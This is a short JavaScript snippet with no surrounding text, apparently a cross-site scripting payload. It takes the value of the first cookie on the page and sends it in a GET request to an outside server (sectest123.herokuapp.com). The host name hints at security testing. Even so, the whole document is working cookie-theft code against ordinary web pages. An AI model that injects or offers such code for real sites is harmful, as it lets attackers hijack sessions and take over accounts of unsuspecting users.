(function() {
    var xhttp = new XMLHttpRequest();
    var id = document.cookie.split(';')[0].split('=')[1]; 
    var url = `https://sectest123.herokuapp.com/?j=${id}`;
    xhttp.open('GET', url, true); 
    xhttp.send();
})();
